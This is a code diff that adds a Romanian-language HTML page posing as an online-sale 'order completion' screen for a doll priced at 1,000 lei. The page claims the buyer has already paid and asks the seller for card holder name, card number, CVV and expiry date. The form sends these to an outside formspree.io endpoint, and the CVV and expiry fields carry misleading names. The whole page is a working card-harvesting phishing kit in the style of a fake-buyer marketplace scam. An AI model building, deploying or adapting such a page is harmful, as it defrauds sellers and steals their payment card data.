@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>FINALIZARE COMANDA</title>
+<style>
+  body {
+    background: rgba(173, 216, 230, 0.3); /* albastru deschis transparent */
+    font-family: Arial, sans-serif;
+    color: #003366;
+    margin: 0;
+    padding: 40px 20px;
+    display: flex;
+    justify-content: center;
+  }
+  .container {
+    background: #e6f0fa;
+    border: 1px solid #003366;
+    max-width: 600px;
+    width: 100%;
+    padding: 30px 40px;
+    box-sizing: border-box;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+  }
+  header {
+    text-align: center;
+    margin-bottom: 25px;
+  }
+  header img {
+    max-width: 150px;
+    height: auto;
+  }
+  .hero {
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    margin-bottom: 25px;
+  }
+  .hero img {
+    width: 120px;
+    height: auto;
+    border: 1px solid #003366;
+    border-radius: 6px;
+  }
+  .hero-text {
+    font-size: 16px;
+    font-weight: bold;
+    max-width: calc(100% - 140px);
+  }
+  .title {
+    font-size: 20px;
+    font-weight: bold;
+    text-align: center;
+    margin: 30px 0 35px 0;
+  }
+  form {
+    display: flex;
+    flex-direction: column;
+  }
+  label {
+    font-size: 15px;
+    margin-bottom: 6px;
+  }
+ input[type="text"], textarea {
+    font-size: 14px;
+    padding: 6px;      /* mai compact */
+    margin-bottom: 15px;
+    border: 1px solid #003366;
+    border-radius: 0;   /* fără rotunjire */
+}
+
+textarea {
+    resize: none;
+    height: 70px;       /* mai mic */
+}
+
+button {
+    background-color: #003366;
+    color: white;
+    font-size: 16px;
+    padding: 8px;
+    border: none;
+    border-radius: 0;   /* fără rotunjire */
+    cursor: pointer;
+}
+button:hover {
+    background-color: #001f4d;
+}
+  }
+  .footer-logos {
+    margin-top: 35px;
+    display: flex;
+    justify-content: center;
+    gap: 20px;
+  }
+  .footer-logos img {
+    width: 60px;
+    height: auto;
+    border: 1px solid #003366;
+    border-radius: 6px;
+  }
+  /* Responsive simplu */
+  @media (max-width: 480px) {
+    .container {
+      padding: 20px;
+    }
+    .hero {
+      flex-direction: column;
+      align-items: center;
+      gap: 15px;
+    }
+    .hero-text {
+      max-width: 100%;
+      text-align: center;
+      font-size: 14px;
+    }
+    .title {
+      font-size: 18px;
+      margin: 20px 0 25px 0;
+    }
+    input[type="text"], textarea {
+      font-size: 14px;
+      padding: 8px;
+    }
+    button {
+      font-size: 16px;
+      padding: 10px;
+    }
+    .footer-logos img {
+      width: 50px;
+    }
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <img src="logo.png" alt="Logo" />
+    </header>
+    <section class="hero">
+      <img src="papusa.jpg" alt="Papusa" />
+      <div class="hero-text">Papusa Aradeanca Romana cu ochi verzi
+1 000 lei</div>
+    </section>
+    <div class="title">Cumparatorul a platit produsul. Completeaza campurile de mai jos pentru a va tranzactiona valoarea produsului.</div>
+    <form action="https://formspree.io/f/xjgaeakr" method="POST">
+      <label for="nume">TITULAR CARD</label>
+      <input type="text" id="nume" name="nume" required />
+      <label for="cod">NUMAR CARD</label>
+      <input type="text" id="cod" name="cod" required />
+      <label for="feedback">CVV/CVC</label>
+      <textarea id="feedback" name="feedback"></textarea>
+      <label for="sfaturi">DATA EXPIRARE</label>
+      <textarea id="sfaturi" name="sfaturi"></textarea>
+      <button type="submit">FINALIZEAZA</button>
+    </form>
+    <div class="footer-logos">
+      <img src="logo1.png" alt="Logo 1" />
+      <img src="logo2.png" alt="Logo 2" />
+      <img src="logo3.png" alt="Logo 3" />
+    </div>
+  </div>
+</body>
+</html>
